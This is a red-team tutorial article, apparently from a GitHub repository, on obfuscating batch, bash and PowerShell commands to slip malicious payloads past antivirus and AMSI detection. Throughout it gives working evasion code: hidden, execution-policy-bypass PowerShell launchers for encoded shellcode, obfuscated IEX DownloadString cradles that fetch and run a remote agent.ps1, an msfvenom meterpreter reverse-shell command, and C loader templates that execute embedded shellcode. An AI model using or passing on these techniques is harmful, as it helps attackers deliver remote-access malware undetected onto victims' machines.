![banner](http://i.cubeupload.com/1Kopfs.jpg)

      This article contains a list of simple obfuscation technics that can be used into obfuscating system
      call's like (powershell.exe -EncodedCommand OR cmd.exe /c start /MIN) in one attempt to bypass AV's
      AMSI and DEP detection mechanisms, why? let assume we have crypted our shellcode with one AES master
      key, and the AV vendor can't read inside the crypted shellcode to determine if there actions are good
      or bad, in this ocasion the AV vendor also looks for system call's that may reveal malicious actions.

![detection pic](http://i.cubeupload.com/pLllwr.jpg)

<br />

      SPECIAL NOTE:
        remember that if we chose to use the 'batch' obfuscation technic, then it will only work in MS-DOS
        interpreter (cmd.exe or file.bat), If we use one 'batch' special character in powershell terminal
        console, then the powershell interpreter will not be able to escape the special character.

**Bad character sellection** [ batch escape character -used- in powershell interpreter ]
![bad character sellection](http://i.cubeupload.com/5bsI07.jpg)

**Good character sellection** [ powershell special character used in powershell interpreter ]
![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)

---

## Glosario:
[0] <- Yes, just because in computing the 0 its an importante number too :P<br />
[1] [Batch Obfuscation Technics (cmd-bat)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#batch-obfuscation-cmd-bat)<br />
[2] [Bash Obfuscation Technics (bash-sh)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bash-obfuscation-bash-sh)<br />
[3] [Powershell Obfuscation Technics (psh-ps1)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#powershell-obfuscation-psh-ps1)<br />
[4] [C to ANCII Obfuscated shellcode (c-ancii)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-to-ancii-obfuscation-c-ancii)<br />
[5] [Bypass Sanbox Execution (AVET)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-daniel-sauder-avet)<br />
[6] [FInal Notes - Remarks](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes---remarks)<br />
[7] [Special Thanks - Referencies](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#special-thanks)<br />
[8] [Send me BitCoins to writte the 2º serie of this article :D](https://chrome.google.com/webstore/detail/no-coin-block-miners-on-t/gojamcfopckidlocpkbelmpjcgmbgjcl)<br />

---

<br /><br /><br /><br /><br />

## Batch Obfuscation (cmd-bat)

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **batch special character: ^** <br />

- String obfuscated<br />

      cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode

![batch obfuscation](http://i.cubeupload.com/IBknFW.jpg)

---

- Any formula under the **batch interpreter** can be start with the follow special characters: **@** or **=** or **,** or **;**

      =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      @cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      ,cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      ;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

![batch obfuscation](http://i.cubeupload.com/nVD7On.jpg)

---

- We can also **pipe** commands to avoid detection, adding rubish data into the beggining of the funtion

      echo "rubish data" | cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

![pipe commands](http://i.cubeupload.com/Ulus3M.jpg)

---

      Using a batch redirection caret (<nul) to add a extra layer of rubish data into your oneliner.
      HINT: the <nul caret will be replaced by a empty string at execution time, And If used the special
      character ^ at the end of the <nul caret them the token written next to it will also be replaced
      by a empty string, Example: cmd.exe /c start <nul^DataToDelete calc

<br />


- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`

- String obfuscated (**<nul**) special character.<br />
`cmd.exe /c <nul powershell.exe <nul -nop -wind hidden -Exec Bypass -noni -enc $shellcode`

![batch obfuscation](http://i.cubeupload.com/cu5bpj.jpg)

---

      Obfuscating windows batch files using undefined environmental variables.
      Inside .bat files undefined environmental variables are expanded into empty strings
      Since cmd.exe allows using variables inside commands, this can be used for obfuscation.

      Choose some set of environmental variables that you are certain are not defined
      on most of the machines Example: single or two letter variables like %A%, %B%, %C%

<br />

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -Exec Bypass -noni -enc $shellcode`<br />

- String obfuscated (**test.bat**)<br />

      @echo off
      %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
      exit

![batch obfuscation](http://i.cubeupload.com/nMLRrc.jpg)

---

      We can also use batch local enviroment variables to scramble the syscall's
      Since cmd.exe allows using variables inside commands, this can be used for obfuscation.
      HINT: chose letters as: 'a e i o u' because they are the most commom ;)
      HINT: dont leave 'empty spaces' defining variables (set i#=t<empty-space>)

<br />

- String command to obfuscate<br />
`netstat -s | findstr Opens`<br />

- String obfuscated (**test.bat**)<br />

      @echo off
      set i#=t
      set pP0=p
      set db0=a
      set !h=n

      %!h%e%i#%st%db0%%i#% -s | fi%!h%ds%i#%r O%pP0%e%!h%s

![batch obfuscation](http://i.cubeupload.com/r6dWN8.jpg)

---

      This next technic uses one batch local variable (%varObj%) as MasterKey that allow us to extract
      strings inside the %varoBj% variable to build our command. [special thanks: @Wandoelmo Silva]

<br />

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />

- String obfuscated (**template.bat**)<br />

      @echo off
      SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
      %varObj:~2,1%%varObj:~11,1%%varObj:~3,1%.exe /c %varObj:~14,1%%varObj:~13,1%%varObj:~25,1%%varObj:~4,1%%varObj:~16,1%%varObj:~17,1%%varObj:~7,1%%varObj:~6,1%%varObj:~10,1%%varObj:~10,1%.exe -nop -%varObj:~25,1%%varObj:~8,1%%varObj:~3,1%%varObj:~3,1%%varObj:~4,1%%varObj:~12,1% -%varObj:~40,1%%varObj:~21,1%%varObj:~4,1%%varObj:~2,1% %varObj:~37,1%%varObj:~24,1%%varObj:~14,1%%varObj:~0,1%%varObj:~17,1%%varObj:~17,1% -noni -%varObj:~4,1%%varObj:~12,1%%varObj:~2,1% $shellcode
      exit

![batch obfuscation](http://i.cubeupload.com/5gkOX8.jpg)

[!] [Description of %varObj% MasterKey (importante reading to understand the mechanism)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md)<br />

---

      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
      the agent.bat dosen't contain any real malicious syscall's to be scan/flagged.

      HINT: Since windows dosen't have a base64 term interpreter built-in installed,
      we have two choises to decode the base64 encoded syscall, or use the built-in
      powershell (::FromBase64String) switch to decode our syscall or we chose to use
      certutil, but certuil onlly accepts strings taken from inside a text file, in
      that situation we instruct our script to writte the text files containing the
      obfuscated syscall's before further head using certutil to decode them.

      REMARK: If the local var can't be accessed from cmd, setX syscall R2V0LURhdGUK

<br />

- String command to obfuscate<br />
`Get-Date`

- using base64 to decode the encoded syscall

      1º - encode the command you want to obfuscate (linux-terminal)
      echo "Get-Date" | base64

      2º - copy the encoded string to paste it on your script
      R2V0LURhdGUK

      3º - Insert the follow lines into your batch script

        @echo off
        set syscall=R2V0LURhdGUK
        powershell.exe $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:syscall)); powershell.exe $decoded ::<-- execute/decode the base64 syscall at runtime

![batch obfuscation](http://i.cubeupload.com/Ofwhkg.jpg)

[0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />

---

<br /><br /><br /><br />

## Bash Obfuscation (bash-sh)

- String command to obfuscate<br />
`whoami`<br />
The above string can be obfuscated using **bash special characters: '** or **\\** or **$@**<br />

- String obfuscated<br />

      w'h'o'am'i <-- This technic requires to 'open' and 'close' the single quotes

      w"h"oa"m"i <-- This technic requires to 'open' and 'close' the double quotes

      w\h\o\am\i

      w$@h$@o$@am$@i

      w$@h\o$@a"m"'i' <-- Using the 4 previous methods together 

![3 special characters](http://i.cubeupload.com/tLBdbW.png)

---

- We can also **pipe** commands to avoid detection with **|** or **;** or **&&**

      echo "Rubish data" | w$@h$@o\am$@i

      echo $@I A\M; who\am$@i

      echo $@I A\M; wh$@oam$@i && echo o\ff$@cou$@rs\e .\.

![pipe bash obfuscation](http://i.cubeupload.com/0oCn6M.png)

---

      Using rev <<< to reverse the order of the characters in a string

<br />

- String command to obfuscate<br />
`lsblk -m`<br />

- String obfuscated <br />
`rev <<< 'm- klbsl' |$0`

![bash rev obfuscation](http://i.cubeupload.com/lsyzo5.png)

- String command to obfuscate<br />
`whoami`<br />

- String obfuscated <br />
`rev <<< i$@ma\o$@hw |$0`

![bash rev obfuscation](http://i.cubeupload.com/Q7qgFW.png)
`HINT: Single quotes are not allowed in Combining rev <<< and the batch (\) escape character`

---

      This next technic uses one bash local variable ($M) as MasterKey that allow us to extract
      strings inside the $M variable to build our command and sends it to a file named meme.
      [special thanks to: @Muhammad Samaak]

<br />

- String command to obfuscate<br />
`route`<br />

- String obfuscated (**oneliner**)<br />

      M="ureto" && echo ${M:1:1}${M:4:1}${M:0:1}${M:3:1}${M:2:1} > meme; ul meme
      [ print parsed data on screen (route syscall pulled from inside $M variable) ]

![bash obfuscation](http://i.cubeupload.com/NdTN6N.jpg)

      M="ureto" && echo ${M:1:1}${M:4:1}${M:0:1}${M:3:1}${M:2:1} |$0
      [ parsing data inside $M variable to extract and 'execute' the string: route ]

![bash obfuscation](http://i.cubeupload.com/eRmZtT.jpg)
`HINT: The var ${M:0:1} extracts the letter U from inside the $M local variable`

---

      This next technic uses $s bash local variable to extract the letters from the variable $skid then
      uses a loop funtion (for i in) to take the arrays and convert them into a string, them the pipe | tr -d
      command will delete the empty lines from the string and passes the output (pipe) to 'do echo ${skid[$i]}'
      funtion that prints the results (full string) on screen, the 'done' funtion will close the 'for i in' loop.
      [special thanks to: @Muhammad Samaak]

<br />

- String command to obfuscate<br />
`whoami`<br />

- String obfuscated (**oneliner**)<br />

      skid=(i h w o a m r w X);s=(2 1 3 4 5 0);for i in ${s[@]};do echo ${skid[$i]} | tr -d '\n';done
      [ parsing data inside $skid and $s variables to extract the string: whoami ]

![bash obfuscation](http://i.cubeupload.com/HkX7JH.png)

      skid=(i h w o a m r w X);s=(2 1 3 4 5 0);for i in ${s[@]};do echo ${skid[$i]} | tr -d '\n';done |$0
      [ parsing data inside $skid and $s variables to 'extract' and 'execute' the string: whoami ]

![bash obfuscation](http://i.cubeupload.com/gdgswy.png)

`HINT: The number 0 inside variable $s conrresponds to the letter possition in var $skid (i)`

---

      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
      the agent.sh dosen't contain any real malicious syscall's to be scan/flagged. 

<br />

- String command to obfuscate<br />
`route -n`

- Using base64 to decode the encoded syscall

      1º - encode the command you want to obfuscate (linux-terminal)
      echo "route -n" | base64

      2º - copy the encoded string to paste it on your script
      cm91dGUgLW4K

      3º - Insert the follow lines into your bash script

        #!/bin/sh
        string=`echo "cm91dGUgLW4K" | base64 -d`
        $string   #<-- execute/decode the base64 syscall at runtime

![bash obfuscation](http://i.cubeupload.com/gXKy3s.png)

[0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />

---

<br /><br /><br /><br />

## Powershell Obfuscation (psh-ps1)

- String command to obfuscate<br />
`powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **powershell special character: `**<br />

- String obfuscated<br />

      po`wer`shel`l.ex`e -n`op -w`in`d h`idd`en -E`xe`c B`yp`ass -n`on`i -en`c $shellcode

![powershell obfuscation](http://i.cubeupload.com/7hUkvC.jpg)

---

- Using one **batch** local variable inside the **powershell interpreter**

      cmd.exe /c "set var=Get-Date && cmd.exe /c echo %var%^" | powershell.exe

![powershell obfuscation](http://i.cubeupload.com/uDdG3G.jpg)

- More Obfuscated using powershell **`** and batch **^** special characters

      c`md`.e`xe /c "s^Et va^r=Get-Date && c^md^.e^xe /c e^ch^o %var%^" | power`shell.`ex`e

![powershell obfuscation](http://i.cubeupload.com/G6rj4M.jpg)

---

      We can obfuscate syscall's by simple split them into local variables or concaternate them

<br />

- String command to obfuscate<br />
`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
The above string can be obfuscated using **powershell special characters:** **`** and **+** and **$var** and **'**<br />

- String obfuscated<br />

      $get = "N`et.Web`Cli`ent";              <-- caret ` inside double quotes
      $Dow = 'Do'+'wn'+'loa'+'dStri'+'ng';    <-- caret + inside single quotes
      powershell.exe IEX (New-Object $get).$Dow('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')

![powershell obfuscation](http://i.cubeupload.com/XvV4bB.jpg)

---
      'Powershell also allow us to access windows environment variables using the $env: switch'
      Using $env:LOCALAPPDATA (windows environment variable) and -Join '' to pull out the 0º ,23º, 21º,7º and 7º
      chars from $env:LOCALAPPDATA and then the -Join '' operator will take the array and convert it to a string.

<br />

- String command to obfuscate<br />
`powershell.exe Get-WmiObject -Class Win32_ComputerSystem`

- String obfuscated<br />

      $call = $env:LOCALAPPDATA[0,23,21,7,7]-Join ''
      powershell.exe Get-WmiObject -$call Win32_ComputerSystem

![powershell obfuscation](http://i.cubeupload.com/hgBowH.jpg)

---

      Build a variable named $encoded with the 'SPLIT' syscall inside, and use $encoded.Split("~~") -Join ''
      to 'de-split' the syscall into a new local variable named $decoded, to be called as a syscall at run-time.

<br />

- String command to obfuscate<br />
`Get-WmiObject -Class Win32_ComputerSystem`

- String obfuscated<br />

      $encoded = "Get-W~~miO~~bject -C~~la~~ss Wi~~n32_Co~~mput~~erSystem"
      $decoded = $encoded.Split("~~") -Join ''
      poweshell.exe $decoded 

![powershell obfuscation](http://i.cubeupload.com/0HwnAL.jpg)

---

      [RTLO] Powershell cames with one buitin feature (::Reverse) that allow us to change the
      text alignment from left to rigth side (arabe alignment). That built-in feature allow us
      to use it as obfuscation technic (writing syscall's backwards) and 'revert' them at runtime.

<br />

- String command to obfuscate<br />
`powershell.exe Get-Date`

- String obfuscated<br />

      [Using ::Reverse Switch]
      $reverseCmd = "etaD.teG exe.llehsrewop"
      $reverseCmdCharArray = $reverseCmd.ToCharArray();[Array]::Reverse($reverseCmdCharArray);
      ($ReverseCmdCharArray-Join '') | IEX

      [Using Regex]
      $reverseCmd = "etaD.teG exe.llehsrewop"
      IEX (-Join[RegEx]::Matches($reverseCmd,'.','RightToLeft')) | IEX


![powershell obfuscation](http://i.cubeupload.com/yukEB8.jpg)

---

      Using -f (reorder) switch to re-order the strings in there correct order, the switch
      -f accepts strings separated by a comma, and the caret {} contains the string position
      after the -f switch.. HINT: we are going to replace another syscall by one concaternated
      local variable to be called at execution time also (3 obfuscation technics used).

<br />

- String command to obfuscate<br />
`Get-Service` And `TeamViewer`

- String obfuscated<br />
`("{0}{2}{1}{3}" -f'vice','Ser','G','et-')` And `$first='Te'+'amV'+'iewer'`

![powershell obfuscation](http://i.cubeupload.com/1hy2GA.jpg)

- **Stacking** commands together with the **&** caret

- String command to obfuscate<br />
`Invoke-Expression (New-Object)`

- String obfuscated<br />
`("{0}{2}{1}{3}" -f'Invoke','es','-Expr','sion') (&( "{0}{2}{1}" -f'(New','ject)','-Ob'))`

---

      Another way to use 'splatting + reorder' technic to remote download/execute agent

- String command to obfuscate<br />
`IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.71/agent.ps1")`

- String obfuscated<br />

      I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.71/Ag`En`T.ps`1")' -f'Ne','Download','http://','lie') | I`EX

![powershell obfuscation](http://i.cubeupload.com/RG5OKP.jpg)

---

      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
      the agent.ps1 dosen't contain any real malicious syscall's to be scan/flagged. 

<br />

- String command to obfuscate<br />
`Date`

- using powershell to decode base64 syscall


      1º - encode the command you want to obfuscate (linux-terminal)
      echo "Date" | base64

      2º - copy the encoded string to paste it on your script
      RGF0ZQo=

      3º - Insert the follow lines into your powershell script

        $Certificate="RGF0ZQo="
        $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Certificate))
        powershell.exe Get-$decoded   #<-- execute/decode the base64 syscall at runtime

![powershell obfuscation](http://i.cubeupload.com/E1Y8xV.jpg)

Here we can view the all process of encoding/decoding in powershell console
![powershell obfuscation](http://i.cubeupload.com/FTnIue.jpg)

---

[!] [All Hail to ''@danielbohannon'' for its extraordinary work (obfuscation) under powershell](https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf)<br />
[0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />

---

<br /><br /><br /><br />

## C to ANCII Obfuscation (c-ancii)

- Encoding shellcode from **C** to **ANCII**

      \x8b\x5a\x00\x27\x0d\x0a  <-- C shellcode

      8b5a00270d0a              <-- ANCII shellcode

---

- Build shellcode in **C** format using msfvenom and escaping **bad chars** (-b '\x0a\x0d')

      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -b '\x0a\x0d' -f c -o shell.txt

- **Parsing** shellcode data (from C to ANCII)

      # store parsed data into '$store' bash local variable
      store=`cat shell.txt | grep -v '=' | tr -d ';' | tr -d '\"' | tr -d '\\' | tr -d 'x' | tr -d '\n'`

- **template.c** to be injected with generated shellcode

      #include
      #include
      #include
      #include
      #include
      #include
      #include

      <stdio.h>
      <stdlib.h>
      <unistd.h>
      <string.h>
      <windows.h>
      <tchar.h>
      <stdlib.h>

      void exec_mycode(unsigned char *mycode)
      {
      int (*funct)();
         funct = (int (*)()) mycode;
         (int)(*funct)();
      }

      // return pointer to mycode
      unsigned char* decode_mycode(unsigned char *buffer, unsigned char *mycode, int size)
      {
      int j=0;
         mycode=malloc((size/2));
         int i=0;
      do
      {
      unsigned char temp[3]={0};
         sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
         mycode[j] = strtoul(temp, NULL, 16);
         i+=2;
         j++;
      } while(i<size);
         return mycode;
      }
         int main (int argc, char **argv)
      {
         unsigned char *mycode;

      unsigned char buffer[]=
      "INSERT_SHELLCODE_HERE";

      int size = sizeof(buffer);
         mycode = decode_mycode(buffer,mycode,size);
         exec_mycode(mycode);
      }


<br />

- **Inject** parsed shellcode into **template.c**

      # inject shellcode into template.c using SED bash command
      sed -i "s/INSERT_SHELLCODE_HERE/$store/" template.c


- Compile template.c with **GCC** software to **.exe**

      gcc.exe template.c -o agent.exe

[0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />

---


<br /><br /><br /><br />

## Bypass the scan engine (daniel sauder: avet)

      This next technic writes a file to disk before executing shellcode into target ram ..
      'Template taken from Avet anti-virus evasion tool presented in blackhat 2017'.

---

![avet bypass](http://i.cubeupload.com/ub18vo.png)

---

<br />

**template.c** from AVET<br />


      #include <stdio.h>
      #include <stdlib.h>
      #include <unistd.h>
      #include <string.h>
      #include <windows.h>
      #include <tchar.h>
      #include <stdlib.h>
      #include <strsafe.h>

      void exec_mycode(unsigned char *mycode)
      {
        int (*funct)();
        funct = (int (*)()) mycode;
        (int)(*funct)();
      }


      int main (int argc, char **argv)
      {
      /*
      msfvenom -p windows/meterpreter/reverse_https lhost=192.168.153.149 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
      */

      unsigned char buffer[]= 
      "\xda\xcc\xba\x6f\x33\x72\xc4\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
      "\x75\x31\x56\x18\x83\xc6\x04\x03\x56\x7b\xd1\x87\x38\x6b\x97"
      "\x68\xc1\x6b\xf8\xe1\x24\x5a\x38\x95\x2d\xcc\x88\xdd\x60\xe0"
      "\xe9\x88\xb7\xf5\xbc\x2b\x91\x9f\xbe\x78\xe1\xb5";
	
      /*
      Here is the bypass. A file is written, this bypasses the scan engine
      */
        HANDLE hFile;
	hFile= CreateFile(_T("hello.txt"), FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) 
		exit(0);

	exec_mycode(buffer);
      }

[0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />

---

<br /><br /><br /><br />

---

## FINAL NOTES - REMARKS

      90% of the obfuscation technics in the 'powershell' section contained in this article are
      based in the exelent 'Invoke-Obfuscation' powershell cmdlet develop by: @danielbohannon.

      Also keep in mind of the most common obfuscations technics like write a file on disk before
      executing any malicious actions (agent execution) replace any main functions (syscall's)
      by base64 encoded strings, and store them inside your script (agent) as local variables
      to be called at runtime execution also remmenber to use 'Rubish Data' piped (|) before your
      system call and the last but not least, Concatenate also all function names to use big and
      small letters (eg PoWeRshElL.exE) since cmd.exe interpreter its not case sensitive.

      Its never to late to remmenber that diferent technics can be combined together to achieve
      better results. The next example shows one powershell payload embbebed into one template.bat
      using 5 diferent batch obfuscation technics found in this article (only batch technics):

<br />

      DE-OBFUSCATED : cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $ENCODED-SHELLCODE-STRING
      OBFUSCATED    : @c^Md%i:~63,1%e^x%i:~3,1% %i:~62,1%c pO^w%U7%h%i:~3,1%L^l%i:~63,1%e^xE %H1%%E0%p -%i:~25,1%%i:~44,1%n^D %i:~7,1%id^D%k8% %H1%ex^EC %i:~1,1%%i:~24,1%P^a%i:~53,1%s %H1%n^o%w2% -%k8%c $ENCODED-SHELLCODE-STRING

[!] [The above OBFUSCATED syscall (string) its embbebed into this demo template.bat](https://pastebin.com/vnNELqd4)<br />
[0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />

---

### Special thanks
**@danielbohannon** **@Andy Green** **@404death**<br />
**@daniel sauder(avet)** **@Wandoelmo Silva** and<br />
**@Muhammad Samaak <-- for is contributions to this project ^_^**

<br />

### Referencies
[0] [This Article Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
[1] https://github.com/govolution/avepoc<br />
[2] https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf<br />
[3] https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
[4] http://www.danielbohannon.com/blog-1/2016/10/1/invoke-obfuscation-v11-release-sunday-oct-9<br />
[5] https://malwaretips.com/threads/how-to-de-obfuscate-powershell-script-commands-examples.76369/<br />
[6] http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier<br />

<br />

## Author: r00t-3xp10it
# Suspicious Shell Activity (red team) @2018
